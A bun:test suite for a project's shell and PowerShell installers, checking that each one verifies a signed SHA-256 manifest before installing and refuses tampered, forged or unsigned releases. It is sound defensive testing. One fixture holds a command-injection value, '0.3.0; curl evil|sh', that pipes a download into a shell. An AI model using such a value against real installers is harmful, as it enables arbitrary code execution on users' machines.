/**
 * The installers and `/client/latest`.
 *
 * Two layers: the served scripts are checked for the verification steps and
 * the pinned key, and the shell installer is then RUN against a stub `curl`
 * that serves a fake release from disk — so "verifies before it installs" is
 * observed behaviour, not a grep. That run renders the same template with a
 * throwaway key, since the real signing seed exists only as a CI secret.
 */

import { afterAll, beforeAll, describe, expect, test } from 'bun:test';
import { createHash, generateKeyPairSync, sign } from 'node:crypto';
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import type { Server } from 'node:http';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  RELEASE_PLATFORM_ASSETS,
  RELEASE_SIGNING_PUBLIC_KEY_PEM,
  releaseAssetUrl,
} from '@tnp/shared-types';
import express from 'express';
import clientRouter, {
  CLIENT_VERSION,
  INSTALL_PS1,
  INSTALL_SH,
  installerRoute,
  readInstallerTemplate,
  renderInstallerTemplate,
} from './client.js';

const DOCUMENTED_PEM = `-----BEGIN PUBLIC KEY-----
MCowBQYDK2VwAyEAn4CCDVyVmPikeULWtYh6ohrhAPvd4n9CvhdDgwVSRjw=
-----END PUBLIC KEY-----`;

let server: Server;
let baseUrl: string;

beforeAll(async () => {
  const app = express();
  app.use('/client', clientRouter);
  server = await new Promise<Server>((resolve) => {
    const listening = app.listen(0, () => resolve(listening));
  });
  const address = server.address();
  if (address === null || typeof address === 'string') throw new Error('no TCP port');
  baseUrl = `http://127.0.0.1:${address.port}`;
});

afterAll(async () => {
  await new Promise<void>((resolve, reject) => {
    server.close((err) => (err ? reject(err) : resolve()));
  });
});

describe('GET /client/latest', () => {
  test('advertises a strict version and only the fixed release URLs', async () => {
    const res = await fetch(`${baseUrl}/client/latest`);
    expect(res.status).toBe(200);
    const body = await res.json();
    expect(body.version).toBe(CLIENT_VERSION);
    expect(body.version).toMatch(/^\d+\.\d+\.\d+$/);
    for (const [platform, asset] of Object.entries(RELEASE_PLATFORM_ASSETS)) {
      expect(body.platforms[platform]).toBe(releaseAssetUrl(CLIENT_VERSION, asset));
    }
    expect(body.checksums).toBe(releaseAssetUrl(CLIENT_VERSION, 'SHA256SUMS'));
    expect(body.signature).toBe(releaseAssetUrl(CLIENT_VERSION, 'SHA256SUMS.sig'));
  });
});

describe('served installers', () => {
  test('are the rendered templates, uncached', async () => {
    const sh = await fetch(`${baseUrl}/client/install.sh`);
    expect(await sh.text()).toBe(INSTALL_SH);
    expect(sh.headers.get('cache-control')).toBe('no-store');
    const ps = await fetch(`${baseUrl}/client/install.ps1`);
    expect(await ps.text()).toBe(INSTALL_PS1);
  });

  test.each([
    ['install.sh', () => INSTALL_SH],
    ['install.ps1', () => INSTALL_PS1],
  ])('%s embeds the documented key, the version and no placeholder', (_name, script) => {
    const text = script();
    expect(RELEASE_SIGNING_PUBLIC_KEY_PEM.trimEnd()).toBe(DOCUMENTED_PEM);
    expect(text).toContain(DOCUMENTED_PEM);
    expect(text).toContain(`"${CLIENT_VERSION}"`);
    expect(text).not.toMatch(/__TNP_[A-Z_]+__/);
    expect(text).toContain('https://github.com/$');
    expect(text).toContain('/releases/download/v$');
    expect(text).toContain('SHA256SUMS.sig');
    // Never an unpinned release, and never the all-DNS option.
    expect(text).not.toContain('releases/latest');
    expect(text).not.toContain('Change system DNS');
    expect(text).not.toMatch(/networksetup|resolvectl dns|Set-DnsClientServerAddress|resolv\.conf/);
  });

  test('install.sh verifies signature and checksum before installing anything', () => {
    expect(INSTALL_SH).toContain(
      // biome-ignore lint/suspicious/noTemplateCurlyInString: shell parameter expansion
      'openssl pkeyutl -verify -pubin -inkey "${WORKDIR}/release-key.pem" -rawin',
    );
    expect(INSTALL_SH).toContain('sha256sum');
    expect(INSTALL_SH).toContain('shasum -a 256');
    expect(INSTALL_SH).toContain('mktemp -d');
    expect(INSTALL_SH).not.toContain('tnp-$$');
    const main = INSTALL_SH.slice(INSTALL_SH.indexOf('\nmain() {'));
    const order = ['download_release', 'verify_signature', 'verify_checksum', 'install_binary'].map(
      (step) => main.indexOf(step),
    );
    expect(order.every((at) => at > 0)).toBe(true);
    expect([...order].sort((a, b) => a - b)).toEqual(order);
  });

  test('install.ps1 verifies the checksum (and signature when it can) before installing', () => {
    expect(INSTALL_PS1).toContain('Get-FileHash -Algorithm SHA256');
    expect(INSTALL_PS1).toContain('pkeyutl -verify -pubin -inkey $pem -rawin');
    expect(INSTALL_PS1).toContain('Only the SHA-256 checksum was checked');
    expect(INSTALL_PS1).not.toContain('tnp-installer-$PID');
    const main = INSTALL_PS1.slice(INSTALL_PS1.indexOf('\nfunction Main {'));
    const order = ['Get-ReleaseFile', 'Test-Signature', 'Test-Checksum', 'Install-Binary'].map(
      (step) => main.indexOf(step),
    );
    expect(order.every((at) => at > 0)).toBe(true);
    expect([...order].sort((a, b) => a - b)).toEqual(order);
  });

  test('install.sh parses as POSIX sh', () => {
    const result = Bun.spawnSync(['sh', '-n'], { stdin: new TextEncoder().encode(INSTALL_SH) });
    expect(result.stderr.toString()).toBe('');
    expect(result.exitCode).toBe(0);
  });

  test('a template refuses a malformed version', () => {
    expect(() =>
      renderInstallerTemplate('__TNP_VERSION__', {
        version: '0.3.0; curl evil|sh',
        repository: 'OxyHQ/tnp',
        publicKeyPem: 'x',
      }),
    ).toThrow();
  });
});

describe('installerRoute (get.tnp.network)', () => {
  test.each([
    ['/', 'curl/8.5.0', '/client/install.sh'],
    ['/', undefined, '/client/install.sh'],
    ['/', 'Mozilla/5.0 (Windows NT 10.0) WindowsPowerShell/5.1.22621', '/client/install.ps1'],
    ['/', 'Mozilla/5.0 (Windows NT 10.0) PowerShell/7.4.0', '/client/install.ps1'],
    ['/install.sh', 'PowerShell/7.4.0', '/client/install.sh'],
    ['/ps', 'curl/8.5.0', '/client/install.ps1'],
    ['/install.ps1', undefined, '/client/install.ps1'],
    ['/other', undefined, null],
  ])('%s with %s → %s', (path, ua, expected) => {
    expect(installerRoute(path, ua)).toBe(expected);
  });
});

// ── Running the shell installer ──────────────────────────────────────────────

const opensslVersion = Bun.spawnSync(['openssl', 'version']).stdout.toString();
const hasOpenSsl3 = /^OpenSSL ([3-9]|[1-9][0-9]+)\./.test(opensslVersion);
const platform = (() => {
  const os =
    process.platform === 'darwin' ? 'darwin' : process.platform === 'linux' ? 'linux' : null;
  const arch = process.arch === 'x64' ? 'x64' : process.arch === 'arm64' ? 'arm64' : null;
  return os && arch ? `${os}-${arch}` : null;
})();
const runnable = platform !== null && hasOpenSsl3;

const VERSION = '0.3.0';
const releaseKey = generateKeyPairSync('ed25519');
const otherKey = generateKeyPairSync('ed25519');

// A stub curl: serves `<fixtures>/<file>` for the release URL ending in /v0.3.0/<file>,
// logs every URL, fails like `curl -f` on anything else.
const FAKE_CURL = `#!/bin/sh
out=""; url=""
while [ $# -gt 0 ]; do
  case "$1" in
    -o) out="$2"; shift 2 ;;
    --proto|--progress-bar) [ "$1" = "--proto" ] && shift; shift ;;
    -*) shift ;;
    *) url="$1"; shift ;;
  esac
done
printf '%s\\n' "$url" >> "$FAKE_LOG"
case "$url" in
  https://github.com/OxyHQ/tnp/releases/download/v${VERSION}/*) ;;
  *) exit 22 ;;
esac
file="$FAKE_RELEASE/\${url##*/}"
[ -f "$file" ] || exit 22
cp "$file" "$out"
`;

interface Run {
  readonly exitCode: number;
  readonly output: string;
  readonly installed: string;
  readonly urls: string[];
  readonly tmpLeft: string[];
}

describe.skipIf(!runnable)('install.sh against a stub release', () => {
  let root: string;
  let script: string;
  const asset = `tnp-${platform}`;
  const binary = `#!/bin/sh\necho "tnp v${VERSION}"\n`;

  function writeRelease(
    dir: string,
    opts: { binary?: string; signer?: typeof releaseKey; sig?: boolean },
  ) {
    mkdirSync(dir, { recursive: true });
    const sums = Object.values(RELEASE_PLATFORM_ASSETS)
      .map((name) => `${createHash('sha256').update(binary).digest('hex')}  ${name}\n`)
      .join('');
    writeFileSync(join(dir, asset), opts.binary ?? binary);
    writeFileSync(join(dir, 'SHA256SUMS'), sums);
    if (opts.sig !== false) {
      const signer = opts.signer ?? releaseKey;
      writeFileSync(join(dir, 'SHA256SUMS.sig'), sign(null, Buffer.from(sums), signer.privateKey));
    }
  }

  function run(
    name: string,
    release: Parameters<typeof writeRelease>[1],
    env: Record<string, string> = {},
    extraBin: Record<string, string> = {},
  ): Run {
    const dir = join(root, name);
    const bin = join(dir, 'bin');
    const tmp = join(dir, 'tmp');
    const installDir = join(dir, 'install');
    mkdirSync(bin, { recursive: true });
    mkdirSync(tmp);
    mkdirSync(installDir);
    writeRelease(join(dir, 'release'), release);
    for (const [cmd, body] of Object.entries({ curl: FAKE_CURL, ...extraBin })) {
      writeFileSync(join(bin, cmd), body);
      chmodSync(join(bin, cmd), 0o755);
    }
    const result = Bun.spawnSync(['sh', script], {
      env: {
        PATH: `${bin}:${process.env.PATH}`,
        HOME: dir,
        TMPDIR: tmp,
        NO_COLOR: '1',
        FAKE_LOG: join(dir, 'urls.log'),
        FAKE_RELEASE: join(dir, 'release'),
        TNP_INSTALL_DIR: installDir,
        ...env,
      },
      stdin: 'ignore',
    });
    const installed = join(installDir, 'tnp');
    return {
      exitCode: result.exitCode,
      output: result.stdout.toString() + result.stderr.toString(),
      installed: existsSync(installed) ? readFileSync(installed, 'utf8') : '',
      urls: existsSync(join(dir, 'urls.log'))
        ? readFileSync(join(dir, 'urls.log'), 'utf8').trim().split('\n')
        : [],
      tmpLeft: readdirSync(tmp),
    };
  }

  beforeAll(() => {
    root = mkdtempSync(join(tmpdir(), 'tnp-installer-test-'));
    const pem = releaseKey.publicKey.export({ type: 'spki', format: 'pem' }).toString();
    script = join(root, 'install.sh');
    writeFileSync(
      script,
      renderInstallerTemplate(readInstallerTemplate('install.sh'), {
        version: VERSION,
        repository: 'OxyHQ/tnp',
        publicKeyPem: pem,
      }),
    );
  });

  afterAll(() => {
    rmSync(root, { recursive: true, force: true });
  });

  test('installs a release whose signature and checksum verify', () => {
    const r = run('ok', {});
    expect(r.output).toContain('Signature on SHA256SUMS verified');
    expect(r.output).toContain(`SHA-256 of ${asset} matches`);
    expect(r.exitCode).toBe(0);
    expect(r.installed).toBe(binary);
    expect(r.urls.sort()).toEqual(
      [asset, 'SHA256SUMS', 'SHA256SUMS.sig']
        .map((f) => `https://github.com/OxyHQ/tnp/releases/download/v${VERSION}/${f}`)
        .sort(),
    );
    expect(r.tmpLeft).toEqual([]);
  });

  test('refuses a tampered binary and installs nothing', () => {
    const r = run('tampered', { binary: '#!/bin/sh\necho evil\n' });
    expect(r.exitCode).not.toBe(0);
    expect(r.output).toContain('Checksum mismatch');
    expect(r.installed).toBe('');
    expect(r.tmpLeft).toEqual([]);
  });

  test('refuses a signature by another key and installs nothing', () => {
    const r = run('forged', { signer: otherKey });
    expect(r.exitCode).not.toBe(0);
    expect(r.output).toContain('NOT a valid signature');
    expect(r.installed).toBe('');
  });

  test('refuses a release with no signature', () => {
    const r = run('unsigned', { sig: false });
    expect(r.exitCode).not.toBe(0);
    expect(r.output).toContain('SHA256SUMS.sig failed');
    expect(r.installed).toBe('');
  });

  test('refuses a malformed TNP_VERSION before downloading anything', () => {
    const r = run('badversion', {}, { TNP_VERSION: '0.3.0/../../x' });
    expect(r.exitCode).not.toBe(0);
    expect(r.output).toContain('Refusing version');
    expect(r.urls).toEqual([]);
  });

  test('without OpenSSL 3, says only the checksum was checked — or refuses when required', () => {
    const libressl = { openssl: '#!/bin/sh\necho "LibreSSL 3.3.6"\n' };
    const r = run('libressl', {}, {}, libressl);
    expect(r.exitCode).toBe(0);
    expect(r.output).toContain('Could not check the release SIGNATURE');
    expect(r.output).toContain('Only the SHA-256 checksum will be checked');
    expect(r.installed).toBe(binary);

    const strict = run('libressl-strict', {}, { TNP_REQUIRE_SIGNATURE: '1' }, libressl);
    expect(strict.exitCode).not.toBe(0);
    expect(strict.installed).toBe('');

    const tampered = run('libressl-tampered', { binary: 'evil' }, {}, libressl);
    expect(tampered.exitCode).not.toBe(0);
    expect(tampered.installed).toBe('');
  });
});

// ── Running the PowerShell installer's verification ─────────────────────────

const pwsh = Bun.which('pwsh');

describe.skipIf(!pwsh || !hasOpenSsl3)('install.ps1 verification under pwsh', () => {
  let dir: string;

  beforeAll(() => {
    dir = mkdtempSync(join(tmpdir(), 'tnp-ps1-test-'));
    const pem = releaseKey.publicKey.export({ type: 'spki', format: 'pem' }).toString();
    const lib = renderInstallerTemplate(readInstallerTemplate('install.ps1'), {
      version: VERSION,
      repository: 'OxyHQ/tnp',
      publicKeyPem: pem,
    });
    expect(lib.endsWith('\nMain\n')).toBe(true);
    writeFileSync(join(dir, 'install-lib.ps1'), lib.slice(0, -'Main\n'.length));

    const binary = 'MZ fake windows binary';
    const sums = Object.values(RELEASE_PLATFORM_ASSETS)
      .map((name) => `${createHash('sha256').update(binary).digest('hex')}  ${name}\n`)
      .join('');
    const fixtures: Record<string, { body: string; signer: typeof releaseKey }> = {
      good: { body: binary, signer: releaseKey },
      tampered: { body: 'evil', signer: releaseKey },
      forged: { body: binary, signer: otherKey },
    };
    for (const [name, { body, signer }] of Object.entries(fixtures)) {
      mkdirSync(join(dir, name));
      writeFileSync(join(dir, name, 'tnp-windows-x64.exe'), body);
      writeFileSync(join(dir, name, 'SHA256SUMS'), sums);
      writeFileSync(
        join(dir, name, 'SHA256SUMS.sig'),
        sign(null, Buffer.from(sums), signer.privateKey),
      );
    }
  });

  afterAll(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  test('verifies a good release and refuses a tampered or forged one', () => {
    const result = Bun.spawnSync(
      [
        pwsh as string,
        '-NoProfile',
        '-NonInteractive',
        '-File',
        join(import.meta.dir, 'fixtures/install-ps1-harness.ps1'),
        '-Dir',
        dir,
      ],
      { env: { PATH: process.env.PATH ?? '', HOME: dir } },
    );
    const output = result.stdout.toString() + result.stderr.toString();
    expect(output).toContain('ALL PASS');
    expect(output).not.toContain('FAIL');
    expect(result.exitCode).toBe(0);
    // pwsh takes several seconds to start on a cold runner.
  }, 120_000);
});
